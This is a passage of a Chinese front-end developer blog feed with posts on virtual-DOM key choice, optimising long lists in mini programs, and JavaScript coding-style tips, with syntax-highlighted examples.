key，算法会认为前两条key是相同的，即相同的节点，就不去更新内部了，造成的结果就是实际第二条没删除，而是删除了第三条</p></blockquote><pre class=" language-js"><code class="language-js">之前的数据                         之后的数据key<span class="token punctuation">:</span> <span class="token number">0</span>  index<span class="token punctuation">:</span> <span class="token number">0</span> name<span class="token punctuation">:</span> test1     key<span class="token punctuation">:</span> <span class="token number">0</span>  index<span class="token punctuation">:</span> <span class="token number">0</span> name<span class="token punctuation">:</span> test1key<span class="token punctuation">:</span> <span class="token number">1</span>  index<span class="token punctuation">:</span> <span class="token number">1</span> name<span class="token punctuation">:</span> test2     key<span class="token punctuation">:</span> <span class="token number">1</span>  index<span class="token punctuation">:</span> <span class="token number">1</span> name<span class="token punctuation">:</span> test2key<span class="token punctuation">:</span> <span class="token number">2</span>  index<span class="token punctuation">:</span> <span class="token number">2</span> name<span class="token punctuation">:</span> test3     </code></pre><h4 id="id作为key"><a href="#id作为key" class="headerlink" title="id作为key"></a>id作为key</h4><pre class=" language-js"><code class="language-js">之前的数据                              删除之后的数据key<span class="token punctuation">:</span> <span class="token number">1</span>  id<span class="token punctuation">:</span> <span class="token number">1</span> index<span class="token punctuation">:</span> <span class="token number">0</span> name<span class="token punctuation">:</span> test1     key<span class="token punctuation">:</span> <span class="token number">1</span>  id<span class="token punctuation">:</span> <span class="token number">1</span> index<span class="token punctuation">:</span> <span class="token number">0</span>  name<span class="token punctuation">:</span> test1key<span class="token punctuation">:</span> <span class="token number">2</span>  id<span class="token punctuation">:</span> <span class="token number">2</span> index<span class="token punctuation">:</span> <span class="token number">1</span> name<span class="token punctuation">:</span> test2     key<span class="token punctuation">:</span> <span class="token number">3</span>  id<span class="token punctuation">:</span> <span class="token number">3</span> index<span class="token punctuation">:</span> <span class="token number">3</span>  name<span class="token punctuation">:</span> test3key<span class="token punctuation">:</span> <span class="token number">3</span>  id<span class="token punctuation">:</span> <span class="token number">3</span> index<span class="token punctuation">:</span> <span class="token number">2</span> name<span class="token punctuation">:</span> test3     </code></pre>]]></content>
      
      
      <categories>
          
          <category> VirtualDOM </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>小程序长列表优化</title>
      <link href="2020/09/20/%E7%A7%BB%E5%8A%A8%E7%AB%AF-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%95%BF%E5%88%97%E8%A1%A8%E4%BC%98%E5%8C%96/"/>
      <url>2020/09/20/%E7%A7%BB%E5%8A%A8%E7%AB%AF-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%95%BF%E5%88%97%E8%A1%A8%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<ul><li>滚动加载</li><li><p>虚拟列表</p></li><li><p>参考：<a href="https://zhuanlan.zhihu.com/p/146791824" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/146791824</a></p></li></ul><p>思路:</p><ol><li>一维数组 =&gt; 二维数组，每个子数组存放十条数据（一屏）</li><li>每加载一屏，计算一下高度，用一个高度数组存储</li><li>对每一屏数据位置进行监听，只有在可视范围内展示</li><li>为防止过快滚动出现白屏，可视范围扩展至屏幕上下各2000高度</li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><ul><li>一维数组 =&gt; 二维数组</li></ul><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>wrp_<span class="token punctuation">'</span> + index1<span class="token punctuation">"</span></span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>(question, index) in questionList<span class="token punctuation">"</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>question.length <span class="token punctuation">></span> 0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item in question<span class="token punctuation">"</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item.questionId<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list-item</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list-item</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-else</span> <span class="token attr-name">:</span><span class="token style-attr language-css"><span class="token attr-name"><span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token punctuation">{</span> <span class="token property">height</span><span class="token punctuation">:</span> pageHeightArr[index<span class="token number">1</span>] + <span class="token string">'px'</span> <span class="token punctuation">}</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><ul><li>调用接口</li></ul><pre class=" language-js"><code class="language-js">        <span class="token function">getQuestionList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 每次调用接口获取 10 条数据，为一组</span>            API<span class="token punctuation">.</span><span class="token function">getList</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>questionList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>dataList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// setHeight: 获取高度</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span></code></pre><ul><li>获取高度与监听</li></ul><pre class=" language-js"><code class="language-js"><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> that <span class="token operator">=</span> <span class="token keyword">this</span>    <span class="token keyword">const</span> wholePageIndex <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pageNum <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>query <span class="token operator">=</span> wx<span class="token punctuation">.</span><span class="token function">createSelectorQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 获取 DOM 元素</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`#wrp_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>wholePageIndex<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 获取高度</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span>        that<span class="token punctuation">.</span>pageHeightArr<span class="token punctuation">[</span>wholePageIndex<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>height        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'高度数组：'</span> <span class="token operator">+</span> that<span class="token punctuation">.</span>pageHeightArr<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 监听</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">observePage</span><span class="token punctuation">(</span>wholePageIndex<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">observePage</span><span class="token punctuation">(</span>pageIndex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 监听可视区域上下各 1500 范围内</span>    <span class="token keyword">const</span> observerObj <span class="token operator">=</span> wx<span class="token punctuation">.</span><span class="token function">createIntersectionObserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">relativeToViewport</span><span class="token punctuation">(</span>        <span class="token punctuation">{</span> top<span class="token punctuation">:</span> <span class="token number">1500</span><span class="token punctuation">,</span> bottom<span class="token punctuation">:</span> <span class="token number">1500</span> <span class="token punctuation">}</span>    <span class="token punctuation">)</span>    observerObj<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`#wrp_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>pageIndex<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>intersectionRatio <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 不在范围内 设置高度</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>$<span class="token keyword">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>questionList<span class="token punctuation">,</span> pageIndex<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pageHeightArr<span class="token punctuation">[</span>pageIndex<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 在范围内 设置数据</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>$<span class="token keyword">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>questionList<span class="token punctuation">,</span> pageIndex<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>dataList<span class="token punctuation">[</span>pageIndex<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 移动端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码规范</title>
      <link href="2020/09/20/%E8%A7%84%E8%8C%83-%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
      <url>2020/09/20/%E8%A7%84%E8%8C%83-%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<ul><li>使用默认值</li><li>解构语法</li><li>删掉注释的代码</li><li>尽量不用“非”条件句</li><li>使用Array.includes来处理多个条件</li><li>多个类似函数</li><li>使用 &amp;&amp; 运算符化简表达式</li><li>空值合并运算符 ‘??’</li><li>可选链操作符 ‘?.’</li><li>代码风格</li><li>一些技巧</li><li>多个变量赋值，交换变量</li><li>字符串重复</li><li>双非位运算符</li><li>数组中的最大值最小值</li><li>巧用this实现链式调用</li><li>新对象替换老对象</li><li>对象数组去重</li><li>巧用apply</li><li>合并对象</li></ul><h2 id="使用默认值"><a href="#使用默认值" class="headerlink" title="使用默认值"></a>使用默认值</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Bad</span><span class="token keyword">function</span> <span class="token function">createMicrobrewery</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> brewryName <span class="token operator">=</span> name <span class="token operator">||</span> <span class="token string">'Hipster Brew'</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Good</span><span class="token keyword">function</span> <span class="token function">createMicrobrewery</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">'Hipster Brew'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span></code></pre><h2 id="解构语法"><a href="#解构语法" class="headerlink" title="解构语法"></a>解构语法</h2><p><strong>如果参数超过两个，可以使用解构语法，不用考虑参数的顺序</strong></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Bad</span><span class="token keyword">function</span> <span class="token function">createMenu</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> body<span class="token punctuation">,</span> buttonText<span class="token punctuation">,</span> cancellable<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Good</span><span class="token keyword">function</span> <span class="token function">createMenu</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">,</span> body<span class="token punctuation">,</span> buttonText<span class="token punctuation">,</span> cancellable <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token function">createMenu</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    title<span class="token punctuation">:</span> <span class="token string">'Foo'</span><span class="token punctuation">,</span>    body<span class="token punctuation">:</span> <span class="token string">'Bar'</span><span class="token punctuation">,</span>    buttonText<span class="token punctuation">:</span> <span class="token string">'Baz'</span><span class="token punctuation">,</span>    cancellable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="删掉注释的代码"><a href="#删掉注释的代码" class="headerlink" title="删掉注释的代码"></a>删掉注释的代码</h2><p><strong>git存在的意义就是保存你的旧代码，所以注释的代码赶紧删掉吧</strong></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Bad</span><span class="token function">doStuff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// doOtherStuff()</span><span class="token comment" spellcheck="true">// doSomeMoreStuff()</span><span class="token comment" spellcheck="true">// doSoMuchStuff()</span><span class="token comment" spellcheck="true">// Good</span><span class="token function">doStuff</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="尽量不用“非”条件句"><a href="#尽量不用“非”条件句" class="headerlink" title="尽量不用“非”条件句"></a>尽量不用“非”条件句</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Bad</span><span class="token keyword">function</span> <span class="token function">isDOMNodeNotPresent</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isDOMNodeNotPresent</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Good</span><span class="token keyword">function</span> <span class="token function">isDOMNodeNotPresent</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDOMNodeNotPresent</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// if后面记得加空格</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span></code></pre><h2 id="使用Array-includes来处理多个条件"><a href="#使用Array-includes来处理多个条件" class="headerlink" title="使用Array.includes来处理多个条件"></a>使用Array.includes来处理多个条件</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span>fruit<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fruit <span class="token operator">==</span> <span class="token string">'apple'</span> <span class="token operator">||</span> fruit <span class="token operator">==</span> <span class="token string">'banana'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>red<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 如果有更多的红色水果怎么办</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span>fruit<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> redFruits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'strawberry'</span><span class="token punctuation">,</span> <span class="token string">'cherry'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>redFruits<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fruit<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>red<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="多个类似函数"><a href="#多个类似函数" class="headerlink" title="多个类似函数"></a>多个类似函数</h2><pre class=" language-js"><code class="language-js"> update <span class="token punctuation">(</span>node<span class="token punctuation">,</span> key<span class="token punctuation">,</span> attrName<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> updateFn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">[</span>attrName <span class="token operator">+</span> <span class="token string">'Updater'</span><span class="token punctuation">]</span>    <span class="token function">updateFn</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> key<span class="token punctuation">,</span> attrName<span class="token punctuation">)</span> <span class="token punctuation">}</span>  textUpdater <span class="token punctuation">(</span>node<span class="token punctuation">,</span> value<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span>  modelUpdater <span class="token punctuation">(</span>node<span class="token punctuation">,</span> value<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span></code></pre><h2 id="使用-amp-amp-运算符化简表达式"><a href="#使用-amp-amp-运算符化简表达式" class="headerlink" title="使用 &amp;&amp; 运算符化简表达式"></a>使用 &amp;&amp; 运算符化简表达式</h2><p>让我们考虑一个具有布尔值和函数的情况。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> isPrime <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">const</span> startWatching <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Started Watching!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>像下面这样，通过检查布尔值来确定是否调用函数，代码太多了。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>isPrime<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">startWatching</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>能否通过 AND（&amp;&amp;）运算符使用简写形式？是的，完全可以避免使用 if 语句。酷吧！</p><pre class=" language-js"><code class="language-js">isPrime <span class="token operator">&amp;&amp;</span> <span class="token function">startWatching</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="空值合并运算符-‘-’"><a href="#空值合并运算符-‘-’" class="headerlink" title="空值合并运算符 ‘??’"></a>空值合并运算符 ‘??’</h2><p>值既不是 <code>null</code> 也不是 <code>undefined</code> 的表达式称为“已定义的（defined）”。</p><p><code>a ?? b</code> 的结果是：</p><ul><li>如果 <code>a</code> 是已定义的，则结果为 <code>a</code>，</li><li>如果 <code>a</code> 不是已定义的，则结果为 <code>b</code>。</li><li>如果第一个参数不是 <code>null/undefined</code>，则 <code>??</code> 返回第一个参数。否则，返回第二个参数。</li></ul><p>通常 <code>??</code> 的使用场景是，为可能是未定义的变量提供一个默认值。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> user<span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>user <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">"Anonymous"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Anonymous</span></code></pre><h3 id="与-比较"><a href="#与-比较" class="headerlink" title="与 || 比较"></a>与 || 比较</h3><p>它们之间重要的区别是：</p><ul><li><code>||</code> 返回第一个 <strong>真</strong> 值。</li><li><code>??</code> 返回第一个 <strong>已定义的</strong> 值。</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>height <span class="token operator">||</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 100</span><span class="token function">alert</span><span class="token punctuation">(</span>height <span class="token operator">?</span><span class="token operator">?</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 0</span></code></pre><h2 id="可选链操作符-‘-’"><a href="#可选链操作符-‘-’" class="headerlink" title="可选链操作符 ‘?.’"></a>可选链操作符 ‘?.’</h2><blockquote><p><strong>可选链</strong>操作符( <strong><code>?.</code></strong> )允许读取位于连接对象链深处的属性的值，而不必明确验证链中的每个引用是否有效。<code>?.</code> 操作符的功能类似于 <code>.</code> 链式操作符，不同之处在于，在引用为空(<a href="https://wiki.developer.mozilla.org/en-US/docs/Glossary/nullish" target="_blank" rel="noopener">nullish</a> ) (<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null" target="_blank" rel="noopener"><code>null</code></a> 或者 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined" target="_blank" rel="noopener"><code>undefined</code></a>) 的情况下不会引起错误，该表达式短路返回值是 <code>undefined</code>。与函数调用一起使用时，如果给定的函数不存在，则返回 <code>undefined</code>。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> adventurer <span class="token operator">=</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span>  cat<span class="token punctuation">:</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'Dinah'</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>adventurer<span class="token punctuation">.</span>cat<span class="token operator">?</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// Dinah</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>adventurer<span class="token punctuation">.</span>dog<span class="token operator">?</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// undefined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>adventurer<span class="token punctuation">.</span>dog<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// Uncaught TypeError: Cannot read property 'name' of undefined</span></code></pre><h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 优化为</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    max<span class="token punctuation">:</span> Math<span class="token punctuation">.</span>max<span class="token punctuation">}</span><span class="token keyword">var</span> numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> roots <span class="token operator">=</span> numbers<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>sqrt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> item <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 当只有一个 return 时简化为</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> item <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span></code></pre><h2 id="多个变量赋值，交换变量"><a href="#多个变量赋值，交换变量" class="headerlink" title="多个变量赋值，交换变量"></a>多个变量赋值，交换变量</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 多个变量赋值</span><span class="token keyword">let</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> ca <span class="token operator">=</span> <span class="token number">5</span>b <span class="token operator">=</span> <span class="token number">8</span>c <span class="token operator">=</span> <span class="token number">12</span><span class="token comment" spellcheck="true">// 利用数组解构</span><span class="token keyword">let</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">// 交换变量</span><span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">55</span><span class="token keyword">const</span> tmp <span class="token operator">=</span> xx <span class="token operator">=</span> yy <span class="token operator">=</span> tmp<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>y<span class="token punctuation">,</span> x<span class="token punctuation">]</span></code></pre><h2 id="字符串重复"><a href="#字符串重复" class="headerlink" title="字符串重复"></a>字符串重复</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  str <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'hello '</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// good</span><span class="token string">'hello '</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span></code></pre><h2 id="双非位运算符"><a href="#双非位运算符" class="headerlink" 